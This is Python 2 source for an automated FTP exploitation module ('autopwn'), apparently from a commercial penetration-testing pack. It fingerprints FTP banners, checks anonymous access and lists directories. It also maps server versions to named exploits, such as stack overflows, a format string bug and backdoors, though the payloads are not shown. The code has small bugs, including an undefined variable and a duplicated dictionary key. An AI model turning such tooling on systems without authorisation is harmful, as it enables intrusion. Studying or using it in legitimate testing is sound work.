#! /usr/bin/env python

#
# Proprietary D2 Exploitation Pack source code - use only under the license 
# agreement specified in LICENSE.txt in your D2 Exploitation Pack
#
# Copyright DSquare Security, LLC, 2007-2010
#

import autopwn
import proto.ftp
import xmlrpclib

class run(autopwn.run):

  CANVAS_EXPLOITS = {
      'CesarFTP 0.99': ['CesarFTP Stack Overflow on MKD command', 'cesarftp'],
      'WAR-FTPD 1.65': ['WarFTP 1.65 Stack Overflow on USER command', 'warftp_165'],
      'SamiFTP v2.0.1': ['SamiFTP Stack Overflow on USER command', 'samiftp'],
      'WFTPD': ['wFTPD Stack Overflow on the SIZE command', 'wftpd'],
      'WS_FTPD': ['Ipswitch WS_FTP Server XCRC Overflow', 'ws_ftpd_xcrc'],
      'wu-ftpd': ['WuFTPD SITE EXEC Formatstring Bug', 'wuftpd_sexec'],
      'ProFTPD': ['Backdoor added to the ProFTPD', 'd2sec_proftpd_bdoor'],
      'ProFTPD': ['mod_sql Username SQL Injection Vulnerability', 'd2sec_proftpd_modsql'],
      'VsFTPD': ['Backdoor added to the VsFTPD', 'd2sec_vsftpd_bdoor'],
  }

  def bannergrab(self, proto): 
    try:
      banner = proto.bannergrab()
    except xmlrpclib.Fault, fault:
      print fault.faultString
      return
    if banner:
      self.db.db_unique_info(self.victim, self.service, 'FTP Banner', 'autopwn_ftp', banner)
      banner = banner.split('\n')
      for b in banner:
        self.log.debug('%s' % b)
    return banner

  def exploit(self, target, port):
    try:
      ftp = proto.ftp.api(target)
    except xmlrpclib.Fault, fault:
      print fault.faultString
      return
    banner = []
    try:
      if ftp.connect() != None:
        banner = self.bannergrab(ftp)
        self.log.info('Check anonymous access')
        if ftp.anonymous():
          self.log.debug('Anonymous access available')
          self.log.info('Directory listing :')
          data = ftp.dirlist()
          self.log.debug('%s' % d)
          db.db_unique_info(self.victim, self.service, 'FTP Anonymous Auth', 'autopwn_ftp', data)
        else:
          self.log.debug('Anonymous access disable')
    except xmlrpclib.Fault, fault:
      print fault.faultString
      return
    self.check_exploits(banner)
